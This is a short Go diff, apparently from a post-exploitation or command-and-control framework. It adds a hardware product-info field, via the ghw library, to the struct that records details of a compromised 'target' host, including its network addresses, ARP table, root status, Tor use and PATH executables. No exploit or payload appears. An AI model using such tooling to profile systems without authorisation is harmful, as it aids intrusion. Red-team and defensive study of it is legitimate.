@@ -7,6 +7,7 @@ import (
 	"os"
 	"strconv"
 
+	"github.com/jaypipes/ghw"
 	"github.com/posener/h2conn"
 	"github.com/txthinking/socks5"
 )
@@ -186,29 +187,30 @@ const (
 
 // AgentSystemInfo agent properties
 type AgentSystemInfo struct {
-	Tag         string        `json:"Tag"`         // identifier of the agent
-	Name        string        `json:"Name"`        // short name of the agent
-	Version     string        `json:"Version"`     // agent version
-	Transport   string        `json:"Transport"`   // transport the agent uses (HTTP2 / CDN / TOR)
-	Hostname    string        `json:"Hostname"`    // Hostname and machine ID
-	Hardware    string        `json:"Hardware"`    // machine details and hypervisor
-	Container   string        `json:"Container"`   // container tech (if any)
-	CPU         string        `json:"CPU"`         // CPU info
-	GPU         string        `json:"GPU"`         // GPU info
-	Mem         string        `json:"Mem"`         // memory size
-	OS          string        `json:"OS"`          // OS name and version
-	GOOS        string        `json:"GOOS"`        // runtime.GOOS
-	Kernel      string        `json:"Kernel"`      // kernel release
-	Arch        string        `json:"Arch"`        // kernel architecture
-	From        string        `json:"From"`        // where the agent is coming from, usually a public IP, or 127.0.0.1
-	IPs         []string      `json:"IPs"`         // IPs that are found on target's NICs
-	ARP         []string      `json:"ARP"`         // ARP table
-	User        string        `json:"User"`        // user account info
-	HasRoot     bool          `json:"HasRoot"`     // is agent run as root?
-	HasTor      bool          `json:"HasTor"`      // is agent from Tor?
-	HasInternet bool          `json:"HasInternet"` // has internet access?
-	Process     *AgentProcess `json:"Process"`     // agent's process
-	Exes        []string      `json:"Exes"`        // executables found in agent's $PATH
+	Tag         string           `json:"Tag"`         // identifier of the agent
+	Name        string           `json:"Name"`        // short name of the agent
+	Version     string           `json:"Version"`     // agent version
+	Transport   string           `json:"Transport"`   // transport the agent uses (HTTP2 / CDN / TOR)
+	Hostname    string           `json:"Hostname"`    // Hostname and machine ID
+	Hardware    string           `json:"Hardware"`    // machine details and hypervisor
+	Container   string           `json:"Container"`   // container tech (if any)
+	CPU         string           `json:"CPU"`         // CPU info
+	GPU         string           `json:"GPU"`         // GPU info
+	Mem         string           `json:"Mem"`         // memory size
+	OS          string           `json:"OS"`          // OS name and version
+	GOOS        string           `json:"GOOS"`        // runtime.GOOS
+	Kernel      string           `json:"Kernel"`      // kernel release
+	Arch        string           `json:"Arch"`        // kernel architecture
+	From        string           `json:"From"`        // where the agent is coming from, usually a public IP, or 127.0.0.1
+	IPs         []string         `json:"IPs"`         // IPs that are found on target's NICs
+	ARP         []string         `json:"ARP"`         // ARP table
+	User        string           `json:"User"`        // user account info
+	HasRoot     bool             `json:"HasRoot"`     // is agent run as root?
+	HasTor      bool             `json:"HasTor"`      // is agent from Tor?
+	HasInternet bool             `json:"HasInternet"` // has internet access?
+	Process     *AgentProcess    `json:"Process"`     // agent's process
+	Exes        []string         `json:"Exes"`        // executables found in agent's $PATH
+	Product     *ghw.ProductInfo `json:"Product"`     // product info
 }
 
 // AgentProcess process info of our agent
